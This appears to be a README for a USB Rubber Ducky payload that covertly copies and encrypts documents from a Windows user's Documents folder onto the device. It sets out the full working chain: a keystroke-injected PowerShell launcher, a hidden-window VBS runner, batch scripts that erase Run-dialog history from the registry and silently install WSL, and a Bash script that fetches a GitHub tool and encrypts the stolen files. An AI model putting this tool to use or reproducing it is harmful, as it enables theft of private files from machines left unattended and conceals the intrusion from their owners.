Scripts for copying ".pdf" files from logged in user's document's directory

## How-To

> Compile slurp.ducky with the following command

```
java -jar duckencode.jar -i slurp.ducky -o /media/DK/inject.bin
```

> Copy following files to root directory of ducky drive

```
Paranoid_Pipes.sh
d.cmd
e.cmd
i.vbs
b.bash
```

> Generate one or two public keys for encryption and copy those keys
> to the root of the SD card too. This can be done manually or via `Gnupg_Gen_Key.sh`
> helper script.

```
parser.asc
rotate.asc
```

> Plug-in ducky to USB port of Windows host.
> Four blinks of capslock LED (the first time) means; payload has started.
> Four blinks (the second time) of capslock means; payload has finished
> sending commands and will be *slurping* shortly.

## How it works

> The slurp.ducky script emulates a keyboard opening the *start* menu and running the
> following command to get things kicked off.

```
powershell ".((gwmi win32_volume -f 'lable=''_''').Name+'d.cmd')"
```

> The d.cmd script is found and executed which among the comments runs the following
> lines to; first notify user that the process has started, and second run the e.cmd
> script in the background via the i.vbs script.

```
@echo off
@cls
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;"
cscript %~d0\i.vbs %~d0\e.cmd
@exit
```

> The i.vbs script only contains one line which uses some obfuscated fancieness to run
> the e.cmd (or any script with full paths or in current working directory) without
> a *pesky* terminal window being opened.

```
CreateObject("WScript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
```

> The e.cmd script is where run line history is deleted from Windows registry, a
> destination directory based off loged in user and time-stamp is made, and target
> directory if found is passed to the `b.bash` script to encrypt files to the USB drive.
> Finally when finished the capslock LED flashes four times again to signal the user
> that backups/copying has finished. Below are the lines used without comments.

```
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
set inst=%~d0\b.bash
mkdir %dst% >>nul
set tgt=%USERPROFILE%\Documents
if Exsist %tgt% (
START "" /B lxrun /install /y && START "" /B bash -c "sudo apt-get update -qqq && sudo apt-get install -yqqq gnupg git && ./%inst% \"%tgt%\" \"%dst%\"" 1>bash_install.log 2>1&
)
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;"
@cls
@exit
```

> The b.bash script is where some Bash magics are preformed to setup for encrypted backups
> Note that the variables, `Var_target` and `Var_destination` *should* correct for
> differances between OS enviroment file path seperators.

```
#!/usr/bin/env bash
Var_script_dir="${0%/*}"
Var_script_name="${0##*/}"
Var_old_pwd="${PWD}"
Var_start_date="$(date -u +%s)"
Var_project_url="https://github.com/S0AndS0/Perinoid_Pipes"
Var_project_main_script_name="Paranoid_Pipes.sh"
Var_target="${1//\\//}"
Var_destination="${2//\\//}"
Var_parsing_pub_key="${Var_script_dir}/parser.asc"
Var_rotate_pub_key="${Var_script_dir}/rotate.asc"
Var_log_file="${Var_destination}/${Var_start_date}_encrypter.log"
Var_parsing_recipient=""
Var_rotate_recipient=""
Var_script_copy_destination="${Var_destination}/${Var_start_date}_encrypter.sh"
Var_pipe_location="${Var_destination}/${Var_start_date}_encrypter.pipe"
Var_bulk_dir="${Var_destination}/${Var_start_date}_encrypter_bulk"
Var_output_file="${Var_destination}/${Var_start_date}_encrypter_results.gpg"
Var_quit_string="quit"
if ! [ -f "${Var_script_dir}/${Var_project_main_script_name}" ]; then
	cd "${Var_script_dir}"
	git clone ${Var_project_url}
	cp "${Var_project_url##*/}/${Var_project_main_script_name}" "${Var_script_dir}/"
else
	cd "${Var_script_dir}"
fi
if ! [ -e "${Var_project_main_script_name}" ]; then
	chmod u+x "${Var_project_main_script_name}"
fi
for _key in ${Var_parsing_pub_key} ${Var_rotate_pub_key}; do
	if [ -f "${_key}" ]; then
		gpg --no-tty --command-fd 0 --import ${_key} <<EOF
trust
5
quit
EOF
	fi
done
if [ -e "${Var_project_main_script_name}" ]; then
	./${Var_project_main_script_name}\
 --log-level='9'\
 --script-log-path="${Var_log_file}"\
 --enc-copy-save-yn='yes'\
 --enc-parsing-disown-yn='yes'\
 --enc-copy-save-path="${Var_script_copy_destination}"\
 --enc-pipe-file="${Var_pipe_location}"\
 --enc-parsing-bulk-out-dir="${Var_bulk_dir}"\
 --enc-parsing-output-file="${Var_output_file}"\
 --enc-parsing-recipient="${Var_parsing_recipient}"\
 --enc-parsing-output-rotate-recipient="${Var_rotate_recipient}"\
 --enc-parsing-quit-string="${Var_quit_string}"
fi
if [ -p "${Var_pipe_location}" ]; then
	echo "${Var_target}" > "${Var_pipe_location}"
	echo "${Var_quit_string}" > "${Var_pipe_location}"
fi
```

>

## Sources of information

Stealing Files with a USB Ruber Ducky Part 1 - Hak5 - 2112
YouTube link: https://youtu.be/48viMtzQ4rE

Stealing Files with a USB Ruber Ducky Part 2 - Hak5 - 2113
YouTube link: https://youtu.be/qzRTpG8TVK4
